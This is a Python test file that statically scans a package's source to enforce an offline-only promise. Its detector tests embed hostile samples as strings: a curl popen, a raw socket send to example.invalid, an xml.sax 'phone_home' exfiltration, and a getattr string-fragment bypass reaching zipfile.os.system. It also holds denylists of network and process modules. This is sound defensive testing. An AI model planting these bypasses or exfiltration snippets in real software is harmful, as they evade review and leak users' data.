"""The promise that nothing leaves the machine, enforced as a test.

adds-up reads price lists, which are commercial documents. Its central claim
is that they stay on the machine that runs it. A sentence in a README cannot
enforce that. This test reads the package's own source and fails if any module
gains the ability to open a connection or start a process.

It checks four things, because no one of them is enough on its own:

* imports, against an allowlist — a denylist has to imagine every door;
* the parts of ``os`` that start another program, by name wherever they
  appear, so an alias or a ``from`` import cannot walk past;
* the dynamic escape hatches — ``__import__``, ``eval``, ``exec``,
  ``importlib``, ``sys.modules`` — which would let any of the above in with no
  import statement to find;
* that everything importable in the package is readable Python source, since a
  compiled extension would be just as importable and contain nothing to parse.

Every detector below has a test proving it can fail. A guard nobody has seen
fail is not a guard.
"""

import ast
import tempfile
import unittest
from pathlib import Path

import adds_up

PACKAGE = Path(adds_up.__file__).parent

#: The only modules this package may import, **as full dotted names**. ``os``
#: is not one of them: nothing here writes a file, so the exception ``os``
#: usually needs is not needed either.
#:
#: The names are dotted rather than top-level because a review broke an
#: earlier version that allowed the package ``xml`` whole. ``xml.sax`` and
#: ``xml.dom.minidom`` resolve a system id over the network — ``parse(url,
#: handler)`` reaches ``urllib.request.urlopen`` — so allowing ``xml`` allowed
#: a working exfiltration path with no socket, no subprocess and no dynamic
#: import anywhere in the source. ``xml.etree`` is what this package uses and
#: ``xml.etree`` is what it may have.
ALLOWED_MODULES = frozenset(
    {
        "__future__", "argparse", "csv", "dataclasses", "decimal", "json",
        "pathlib", "re", "sys", "xml.etree", "zipfile",
    }
)


def _allowed(module: str) -> bool:
    """Whether an imported name is on the allowlist.

    An allowed dotted name permits itself and anything under it, so
    ``xml.etree.ElementTree`` is fine and ``xml.sax`` is not. A bare parent of
    an allowed name is *not* allowed: ``import xml`` gives access to every
    subpackage, which is the hole this closes.
    """
    return any(
        module == name or module.startswith(name + ".") for name in ALLOWED_MODULES
    )

FORBIDDEN_OS_CALLS = frozenset(
    {
        "execl", "execle", "execlp", "execv", "execve", "execvp", "execvpe",
        "fork", "forkpty", "popen", "posix_spawn", "posix_spawnp", "spawnl",
        "spawnle", "spawnlp", "spawnv", "spawnve", "spawnvp", "spawnvpe",
        "startfile", "system",
    }
)

#: Ways to reach a forbidden capability without naming it in an import.
#: ``compile`` is deliberately absent: ``re.compile`` is how every pattern in
#: this package is built. ``getattr`` is present, because assembling a name
#: from string fragments is how a review walked past the attribute check.
FORBIDDEN_NAMES = frozenset(
    {
        "__builtins__", "__import__", "builtins", "eval", "exec", "getattr",
        "globals", "importlib", "locals", "modules", "setattr", "vars",
    }
)

#: Module names that an allowed module re-exposes as an attribute of itself.
#:
#: ``zipfile`` does ``import os``, so ``zipfile.os`` is the real ``os`` module
#: and ``zipfile.os.system(...)`` spawns a process without ``os`` appearing in
#: any import statement. A review used exactly that, with the two names
#: assembled from string fragments to defeat the attribute check, and the
#: whole suite stayed green. Both halves are now refused: ``getattr`` above,
#: and the module names here.
REEXPORTED_MODULES = frozenset(
    {
        "os", "sys", "subprocess", "socket", "ssl", "ctypes", "shutil",
        "urllib", "http", "ftplib", "smtplib", "telnetlib", "asyncio",
        "multiprocessing", "threading", "signal", "platform", "webbrowser",
        "sysconfig", "site", "pty", "tty", "runpy", "pickle", "marshal",
        "codecs", "posix", "nt", "_socket", "_ssl", "_posixsubprocess",
    }
)

FORBIDDEN_ATTRIBUTES = FORBIDDEN_OS_CALLS | REEXPORTED_MODULES | {
    "__builtins__", "__dict__", "__getattribute__", "__globals__",
    "__import__", "__subclasses__", "eval", "exec", "getattr", "modules",
}


def modules() -> list[Path]:
    return sorted(PACKAGE.rglob("*.py"))


def offences(source: str, filename: str = "<source>") -> set[str]:
    """Everything in ``source`` that would break the offline promise."""
    tree = ast.parse(source, filename=filename)
    found: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                if not _allowed(alias.name):
                    found.add(f"import {alias.name}")
        elif isinstance(node, ast.ImportFrom):
            module = node.module or ""
            if node.level == 0 and not _allowed(module):
                found.add(f"from {module} import ...")
            for alias in node.names:
                if alias.name == "*":
                    found.add(f"from {node.module} import *")
                elif alias.name in FORBIDDEN_OS_CALLS or alias.name in FORBIDDEN_NAMES:
                    found.add(f"from {node.module} import {alias.name}")
        elif isinstance(node, ast.Attribute):
            if node.attr in FORBIDDEN_ATTRIBUTES:
                found.add(f".{node.attr}")
        elif isinstance(node, ast.Name):
            if node.id in FORBIDDEN_OS_CALLS or node.id in FORBIDDEN_NAMES:
                found.add(node.id)
        elif isinstance(node, ast.Constant) and isinstance(node.value, str):
            if node.value in FORBIDDEN_OS_CALLS:
                found.add(f"literal {node.value!r}")
    return found


class NothingLeavesTheMachine(unittest.TestCase):
    def test_there_are_modules_to_check(self):
        self.assertGreater(len(modules()), 5)

    def test_the_whole_package_is_scanned(self):
        names = {path.name for path in modules()}
        for expected in ("cli.py", "checks.py", "tables.py", "numbers.py", "columns.py"):
            self.assertIn(expected, names)

    def test_the_package_contains_nothing_but_python_source(self):
        """Everything importable must be something this check can read.

        A compiled extension or a sourceless ``.pyc`` in the package would be
        just as importable and would contain no source to parse, so it would
        pass unexamined. Rather than trying to inspect a binary, refuse to
        have one.
        """
        strays = [
            path
            for path in PACKAGE.rglob("*")
            if path.is_file()
            and path.suffix != ".py"
            and "__pycache__" not in path.parts
        ]
        self.assertEqual(strays, [], f"non-source files: {[str(p) for p in strays]}")

    def test_no_module_can_reach_out(self):
        for module in modules():
            with self.subTest(module=str(module.relative_to(PACKAGE))):
                found = offences(module.read_text(encoding="utf-8"), str(module))
                self.assertEqual(found, set(), f"{module.name}: {sorted(found)}")


class TheGuardCanFail(unittest.TestCase):
    """Each detector, shown catching the thing it exists to catch."""

    def assert_caught(self, source: str, expected: str):
        self.assertIn(expected, offences(source))

    def test_catches_a_plain_import(self):
        self.assert_caught("import socket\n", "import socket")

    def test_catches_a_dotted_import(self):
        self.assert_caught("import urllib.request\n", "import urllib.request")

    def test_the_allowlist_is_dotted_so_a_parent_package_is_not_a_free_pass(self):
        """`xml.etree` is allowed. `xml` is not, and `xml.sax` reaches the network.

        `xml.sax.parse(url, handler)` resolves a system id through
        `urllib.request.urlopen`. A review used it to exfiltrate with the whole
        suite green, because the allowlist held the top-level name `xml`.
        """
        self.assertEqual(offences("from xml.etree import ElementTree\n"), set())
        self.assert_caught("import xml\n", "import xml")
        self.assert_caught("from xml.sax import parse\n", "from xml.sax import ...")
        self.assert_caught("from xml.dom import minidom\n", "from xml.dom import ...")

    def test_catches_a_module_reached_through_another_module(self):
        """`zipfile` does `import os`, so `zipfile.os` is the real thing.

        The review's proof of concept assembled both names from fragments to
        defeat the attribute check — `getattr(getattr(zipfile, "o"+"s"),
        "sys"+"tem")(command)` — and it ran. Refusing `getattr` and refusing
        the module names as attributes closes both halves.
        """
        self.assert_caught("import zipfile\nzipfile.os.system('x')\n", ".os")
        self.assert_caught(
            'import zipfile\ngetattr(zipfile, "o"+"s")\n', "getattr"
        )
        for module in ("subprocess", "socket", "urllib", "shutil", "ctypes"):
            with self.subTest(module=module):
                self.assert_caught(f"import zipfile\nzipfile.{module}\n", f".{module}")

    def test_catches_a_from_import(self):
        self.assert_caught("from http import client\n", "from http import ...")

    def test_catches_a_star_import(self):
        self.assert_caught("from urllib import *\n", "from urllib import *")

    def test_catches_os_itself(self):
        # os is not on the allowlist for this package at all.
        self.assert_caught("import os\n", "import os")

    def test_catches_a_process_launch(self):
        self.assert_caught("import os\nos.popen('curl example.com')\n", ".popen")
        self.assert_caught("from os import system\n", "from os import system")
        self.assert_caught("import os as o\no.popen('x')\n", ".popen")

    def test_catches_the_spawn_family_completely(self):
        for call in ("spawnv", "spawnvpe", "posix_spawn", "forkpty", "execve"):
            with self.subTest(call=call):
                self.assert_caught(f"import os\nos.{call}()\n", f".{call}")

    def test_catches_the_name_hidden_in_a_string(self):
        self.assert_caught("x = 'popen'\n", "literal 'popen'")

    def test_catches_the_private_import_of_an_allowed_parent(self):
        self.assert_caught("import xml.parsers.expat\n", "import xml.parsers.expat")

    def test_catches_the_private_accelerators(self):
        for module in ("_socket", "_ssl", "_ctypes", "_posixsubprocess"):
            with self.subTest(module=module):
                self.assert_caught(f"import {module}\n", f"import {module}")

    def test_catches_the_polite_front_doors(self):
        self.assert_caught(
            "from concurrent.futures import ProcessPoolExecutor\n",
            "from concurrent.futures import ...",
        )
        self.assert_caught(
            "from logging.handlers import HTTPHandler\n",
            "from logging.handlers import ...",
        )

    def test_catches_a_module_nobody_thought_to_ban(self):
        for module in ("runpy", "pty", "venv", "wsgiref", "ftplib", "smtplib"):
            with self.subTest(module=module):
                self.assert_caught(f"import {module}\n", f"import {module}")

    def test_catches_reaching_through_a_dunder(self):
        self.assert_caught("import x\nx.__dict__['system']('y')\n", ".__dict__")
        self.assert_caught("x.__getattribute__('popen')()\n", ".__getattribute__")

    def test_catches_the_module_table(self):
        self.assert_caught("import sys\nsys.modules['socket']\n", ".modules")
        self.assert_caught("from sys import modules\n", "from sys import modules")

    def test_catches_the_dynamic_import_hatches(self):
        self.assert_caught("x = __import__('socket')\n", "__import__")
        self.assert_caught("import importlib\n", "import importlib")
        self.assert_caught("eval('1')\n", "eval")
        self.assert_caught("exec('pass')\n", "exec")

    def test_allows_what_this_package_actually_uses(self):
        source = (
            "import csv\nimport re\nimport zipfile\n"
            "from xml.etree import ElementTree\n"
            "from decimal import Decimal\n"
            "re.compile('x')\n"
        )
        self.assertEqual(offences(source), set())

    def test_a_real_smuggled_module_is_caught(self):
        source = (
            "import _socket\n"
            "from logging.handlers import SocketHandler\n"
            "\n"
            "def send(payload):\n"
            "    connection = _socket.socket()\n"
            "    connection.connect(('example.invalid', 80))\n"
            "    connection.send(payload)\n"
        )
        found = offences(source)
        self.assertIn("import _socket", found)
        self.assertIn("from logging.handlers import ...", found)

    def test_the_two_bypasses_a_review_actually_executed(self):
        """Both of these ran, and the suite stayed green, before this test.

        They are kept verbatim rather than paraphrased, because a guard that
        has not been shown to stop the exact attack it was written for is a
        guard nobody has seen fail.
        """
        exfiltration = (
            "from xml.sax import parse\n"
            "from xml.sax.handler import ContentHandler\n"
            "def phone_home(url):\n"
            "    parse(url, ContentHandler())\n"
        )
        self.assertIn("from xml.sax import ...", offences(exfiltration))

        shell = (
            "import zipfile\n"
            "def run(command):\n"
            '    return getattr(getattr(zipfile, "o"+"s"), "sys"+"tem")(command)\n'
        )
        self.assertIn("getattr", offences(shell))

    def test_scanner_reads_a_file_from_disk(self):
        with tempfile.TemporaryDirectory() as directory:
            sample = Path(directory) / "sample.py"
            sample.write_text("import socket\n", encoding="utf-8")
            self.assertIn("import socket", offences(sample.read_text(encoding="utf-8")))


class WhatThisDoesNotCover(unittest.TestCase):
    """The limits of this check, written down rather than left to be found.

    This is a static read of one package's source: a guard against drift, not
    a sandbox. It does not run the code, it cannot see what a dependency does,
    and a name assembled at runtime from pieces — ``"po" + "pen"`` — never
    appears in the source for it to find.

    The larger gap is the filesystem. Reading files is the whole job, so
    ``pathlib`` and ``open`` are allowed, and no static read can tell a local
    path from a network one: an SMB or NFS mount, a UNC path or a FUSE
    filesystem reaches the network with no socket call in this package's
    source. That is real, and it is written here and in ``docs/limitations.md``
    rather than left to be discovered.
    """

    def test_the_package_declares_no_dependencies(self):
        manifest = (PACKAGE.parent / "pyproject.toml").read_text(encoding="utf-8")
        self.assertIn("dependencies = []", manifest)


if __name__ == "__main__":
    unittest.main()
